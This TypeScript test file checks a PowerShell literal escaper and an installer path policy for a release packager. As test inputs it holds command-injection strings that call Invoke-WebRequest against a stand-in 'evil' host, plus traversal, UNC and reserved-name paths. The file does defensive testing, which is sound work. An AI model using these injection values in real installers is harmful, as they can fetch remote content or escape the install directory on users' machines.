// tests/wave-p0/p0-installer-path-security.test.ts — P0-03：安装器 PowerShell 字面量与路径策略
// appName/entry/path 绝不直接插入 PowerShell 源码；路径统一拒绝 /、\、..、drive/UNC、保留名、重复和大小写冲突。
import { describe, expect, it } from 'vitest';
import { psSingleQuotedLiteral } from '../../src/application/release/powershellLiteral.js';
import { validateInstallerPaths } from '../../src/application/release/installerPathPolicy.js';
import { buildInstallerPackage } from '../../src/application/release/installerPackager.js';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

describe('powershell single-quoted literal', () => {
  it('escapes single quotes by doubling', () => {
    expect(psSingleQuotedLiteral("it's")).toBe("'it''s'");
  });

  it.each([
    ['$()', "'$()'"],
    ['`tick', "'`tick'"],
    ['"double"', "'\"double\"'"],
    ['a\nb', "'a\nb'"],
    ['${env:USERPROFILE}', "'${env:USERPROFILE}'"],
  ])('neutralizes %s into a passive literal', (input, expected) => {
    expect(psSingleQuotedLiteral(input)).toBe(expected);
  });

  it('keeps the result ASCII-safe and free of raw PowerShell interpolation', () => {
    const literal = psSingleQuotedLiteral("$(Invoke-WebRequest 'http://evil')`n$x");
    expect(literal).toBe("'$(Invoke-WebRequest ''http://evil'')`n$x'");
  });
});

describe('installer path policy', () => {
  it('accepts a clean relative path set with a matching entry', () => {
    const result = validateInstallerPaths(['dist/cli/index.js', 'README.md'], 'dist/cli/index.js');
    expect(result).toMatchObject({ ok: true });
  });

  it.each([
    { name: 'parent traversal', files: ['../escape.js'], entry: 'index.js', code: 'INSTALLER_PATH_INVALID' },
    { name: 'backslash separator', files: ['dist\\cli\\index.js'], entry: 'index.js', code: 'INSTALLER_PATH_INVALID' },
    { name: 'absolute path', files: ['C:/tmp/x.js'], entry: 'index.js', code: 'INSTALLER_PATH_INVALID' },
    { name: 'drive-relative', files: ['C:index.js'], entry: 'index.js', code: 'INSTALLER_PATH_INVALID' },
    { name: 'UNC path', files: ['//server/share/x.js'], entry: 'index.js', code: 'INSTALLER_PATH_INVALID' },
    { name: 'empty segment', files: ['a//b.js'], entry: 'index.js', code: 'INSTALLER_PATH_INVALID' },
    { name: 'dot segment', files: ['./x.js'], entry: 'index.js', code: 'INSTALLER_PATH_INVALID' },
    { name: 'reserved name', files: ['CON'], entry: 'index.js', code: 'INSTALLER_PATH_RESERVED_NAME' },
    { name: 'duplicate path', files: ['a.js', 'a.js'], entry: 'a.js', code: 'INSTALLER_PATH_DUPLICATE' },
    { name: 'case-conflicting path', files: ['A.js', 'a.js'], entry: 'a.js', code: 'INSTALLER_PATH_CASE_CONFLICT' },
    { name: 'entry outside closure', files: ['other.js'], entry: 'missing.js', code: 'INSTALLER_ENTRY_INVALID' },
  ])('rejects $name', ({ files, entry, code }) => {
    expect(validateInstallerPaths(files, entry)).toMatchObject({ ok: false, error: { code } });
  });
});

describe('installer packager integration', () => {
  it('emits a literal-encoded install script and rejects an unsafe file tree', async () => {
    const outDir = mkdtempSync(join(tmpdir(), 'wxnodus-installer-policy-'));
    try {
      const malicious = await buildInstallerPackage({
        appName: 'demo',
        version: '1.0.0',
        icon: null,
        entryPath: 'dist/cli/index.js',
        files: new Map([
          ['dist/cli/index.js', Buffer.from('entry')],
          ['../escape.js', Buffer.from('escape')],
        ]),
        outDir,
      });
      expect(malicious).toMatchObject({ ok: false, error: { code: 'INSTALLER_PATH_INVALID' } });

      const injectedName = 'demo$(Invoke-WebRequest evil)';
      const clean = await buildInstallerPackage({
        appName: injectedName,
        version: '1.0.0',
        icon: null,
        entryPath: 'dist/cli/index.js',
        files: new Map([['dist/cli/index.js', Buffer.from('entry')]]),
        outDir,
      });
      expect(clean.ok).toBe(true);
      if (!clean.ok) throw new Error(clean.error.code);
      const { readZip } = await import('../../src/application/release/zipArchive.js');
      const zipBytes = readFileSync(join(outDir, `${clean.value.manifest.appName}-1.0.0.zip`));
      const unpacked = readZip(zipBytes);
      expect(unpacked.ok).toBe(true);
      if (!unpacked.ok) throw new Error('zip readback failed');
      const script = unpacked.value.get('install.ps1')!;
      const scriptText = script.toString('utf8').replace(/^\uFEFF/, '');
      expect(scriptText).toContain(psSingleQuotedLiteral(injectedName));
      expect(scriptText).not.toContain(`${injectedName}"`);
    } finally {
      rmSync(outDir, { recursive: true, force: true });
    }
  });
});
